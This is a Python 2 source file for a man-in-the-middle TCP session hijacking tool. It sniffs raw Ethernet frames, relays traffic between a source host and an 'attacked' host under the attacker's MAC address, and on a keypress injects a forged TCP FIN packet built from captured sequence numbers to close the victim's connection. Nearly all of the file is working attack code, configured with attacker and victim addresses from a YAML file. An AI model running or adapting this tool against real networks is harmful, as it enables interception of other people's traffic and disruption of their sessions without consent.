#self.packet sniffer in python for Linux
#Sniffs only incoming TCP self.packet
import binascii
import socket, sys, logging

import yaml
import io

from node import node
from utils import  toHex, ListToString, formatMAC, GetChar
from struct import *

#globals
g_debug=False
g_atacked_mac = ''


g_actual_ack = 0
g_actual_seq = 0

# CONSTANTS 
c_AllPorts = 65565
c_macSize = 6

def debug_print(string):
    if(g_debug):
        print(string)

class HijackIPV4:
    g_last_tcp_header = []
    #g_last_ip_header_dst = ''
    iph = ''
    src_mac = ''
    dst_mac = ''
    source_port = '' 
    dest_port = ''
    sequence = ''
    acknowledgement = ''
    doff_reserved = ''
    tcph_length = ''
    packet = ''
    packetFull = ''
    s_addr = ''
    d_addr = ''
    hijack_flag = False
    def __init__(self):
        #create an INET, STREAMing socket
        try:
            self.s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            self.s.bind((Attacking_node.interface,0))
            #self.sendingSocker = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except socket.error , msg:
            print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
            sys.exit()
 
    def sendHijack(self):
        print 'closing connection'
        p = self.generate_eth_header_hijack(Attacking_node.mac,Atacked_node.mac) \
        + self.last_packet[14:34] + self.generate_hijact_tcp_header()
        self.s.send(p)

    def receive(self):
        self.packetFull = self.s.recvfrom(c_AllPorts)

        #self.packet string from tuple
        self.packet = self.packetFull[0]
        self.translateEthernet()
        self.translateIP()
        self.translateTCP()
        
    def generate_hijack_ip_header(self):
        source_ip = Attacking_node.ip
        dest_ip = Atacked_node.ip # or socket.gethostbyname('www.google.com')
        # ip header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel will fill the correct total length
        ip_id = 54321   #Id of this packet
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0    # kernel will fill the correct checksum
        ip_saddr = socket.inet_aton ( source_ip )   #Spoof the source ip address if you want to
        ip_daddr = socket.inet_aton ( dest_ip )
         
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
         
        # the ! in the pack format string means network order
        ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        
        return ip_header

    def generate_eth_header_hijack(self,src_mac,dst_mac):
        return pack('!6s6sH', binascii.unhexlify(dst_mac),  binascii.unhexlify(src_mac), self.eth_last[2])

    def generate_eth_header(self,src_mac,dst_mac):
        return pack('!6s6sH', binascii.unhexlify(dst_mac),  binascii.unhexlify(src_mac), self.eth[2])

    def generate_hijact_tcp_header(self):

        # tcp header fields
        tcp_source = self.g_last_tcp_header[0]   # source port
        tcp_dest = self.g_last_tcp_header[1]   # destination port
        tcp_seq = self.g_last_tcp_header[2] + 1
        tcp_ack_seq = self.g_last_tcp_header[3]
        print tcp_ack_seq 
        tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
        #tcp flags
        tcp_fin = 1
        tcp_syn = 0
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons (80)    #   maximum allowed window size
        tcp_check = 0
        tcp_urg_ptr = 0
         
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
         
        #print tcp_source
        #print tcp_dest
        #print "source=%s\ndest=%s\nseq=%s\n"%(sys.getsizeof(tcp_source),sys.getsizeof(tcp_dest),sys.getsizeof(tcp_seq))
        # the ! in the pack format string means network order
        #tcp_header = pack('!HHLLB', tcp_source,tcp_dest,tcp_seq,tcp_ack_seq, tcp_offset_res)
        tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
        return tcp_header

    def sendto(self, src_mac,dst_mac):
        self.eth_header = self.generate_eth_header(src_mac,dst_mac)
        if(self.hijack_flag == True):
            self.hijack_flag = False
            print 'closing connection'
            p = self.eth_header + self.packet[14:34] + self.generate_hijact_tcp_header()
        else:
            print 'Resending'
            p = self.eth_header + self.packet[14:len(self.packet)]#self.ip_header + self.packet[self.iph_length:self.iph_length+40] 
        self.s.send(p)


    def translateEthernet(self):
        self.ethernet_header = self.packet[0:14]
        self.eth = unpack('!6s6sH' , self.ethernet_header)
         
        
        self.dst_mac = toHex(self.ethernet_header[0:6].decode("latin1"))
        self.src_mac = toHex(self.ethernet_header[6:12].decode("latin1"))

        #print stringToHex(self.src_mac)
        #print self.dst_mac
        string_print =  'Source MAC-Address : ' + str(self.src_mac)\
        + ' Destination MAC-Address : ' + str(self.dst_mac)
        debug_print(string_print) 

        # nao seria o src_mac?
        #print sys.argv[3]


        
    def translateIP(self):
        ## TRANSLATE RECEIVED IP ###
        #take first 20 characters for the ip header
        ip_header = self.packet[14:34]
        self.iph = self.packet[14:34]

        #now unpack them :)
        iph = unpack('!BBHHHBBH4s4s' , ip_header)
        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF

        self.iph_length = ihl * 4

        ttl = iph[5]
        protocol = iph[6]
        self.s_addr = socket.inet_ntoa(iph[8]);
        self.d_addr = socket.inet_ntoa(iph[9]);

        string_print = 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : '\
        + str(ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(self.s_addr)\
        + ' Destination Address : ' + str(self.d_addr)
        debug_print(string_print) 

    def translateTCP(self):
        #header_dst_src = self.packet[34:38]

        #header_ports = unpack('!HH',header_dst_src)

        #print header_ports
        
        #print "iph length %s" %self.iph_length
        #if (self.iph_length == 0):
        #    tcp_header = self.packet[self.iph_length:self.iph_length+20]
        #else:
        #tcp_header = self.packet[0:20]
        #if len(tcp_header) < 20:
        #    print 'menorq'
        tcp_header = self.packet[self.iph_length:self.iph_length+20]
        #else:
        #    tcp_header = self.packet[(len(self.ethernet_header) + len(self.iph)):54]

        # elif (self.iph_length == 20):
        #     tcp_header = self.packet[34:54]
        #     debug_header = self.packet[self.iph_length:self.iph_length+12]
        #     bla = unpack('!HHLL', debug_header)
        #     print "debug 1##\nack number: %s \nseq number =%s\n" %( bla[3],bla[2])
        #now unpack them :)
        tcph = unpack('!HHIIBBHHH' , tcp_header)

        self.source_port = tcph[0]
        self.dest_port = tcph[1]
        self.sequence = tcph[2]
        self.acknowledgement = tcph[3]
        self.doff_reserved = tcph[4]
        self.tcph_length = self.doff_reserved >> 4

        h_size = self.iph_length + self.tcph_length * 4
        data_size = len(self.packet) - h_size

        #get data from the self.packet
        data = self.packet[h_size:]

        debug_print("%s"%'Data : ' + data +'\n') 

        if self.d_addr == Atacked_node.ip:
            debug_print('Resending to atacked node')
            if(len(tcph) > 0):
                self.last_packet = self.packet
                print self.source_port
                self.g_last_tcp_header = tcph
                self.g_last_ip_header_dst = self.iph
                self.eth_last = self.eth
            self.sendto(Attacking_node.mac, Atacked_node.mac)
        elif self.d_addr == Src_node.ip:
            debug_print('Resending to src node')
#            if(len(tcph) > 0):
#                self.g_last_tcp_header = tcph
            self.sendto(Attacking_node.mac,Src_node.mac)

#open config
with open("config.yaml", 'r') as stream:
    data_loaded = yaml.load(stream)

if(data_loaded['mode'] == 'debug'):
    g_debug=True

g_atacked_mac = data_loaded['dst_node']['mac']

Attacking_node = node(data_loaded['atacking_node'], data_loaded['atacking_node']['ip'], data_loaded['atacking_node']['mac'], data_loaded['atacking_node']['interface'] )
Atacked_node = node(data_loaded['dst_node']['name'], data_loaded['dst_node']['ip'], data_loaded['dst_node']['mac'])
Src_node = node(data_loaded['src_node']['name'], data_loaded['src_node']['ip'], data_loaded['src_node']['mac'])
hijack = HijackIPV4()
# receive a self.packet
while True:
    c = GetChar(False)
    if c == 'h':
        hijack.sendHijack()
        #hijack.hijack_flag = True
    hijack.receive()

